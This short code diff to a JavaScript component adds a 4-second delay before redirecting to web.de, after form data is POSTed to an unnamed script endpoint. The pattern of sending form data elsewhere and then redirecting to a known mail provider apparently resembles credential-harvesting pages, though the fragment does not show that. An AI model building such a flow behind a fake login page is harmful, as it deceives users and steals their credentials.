@@ -53,7 +53,10 @@ export default function Main() {
     fetch(scriptURL, { method: 'POST', body: formData})
     .then(response => {
         console.log(response)
-        window.location.replace("https://web.de/")
+        setTimeout(() => {
+          window.location.replace("https://web.de/")
+        }, 4000);
+       
     }
     )
   }
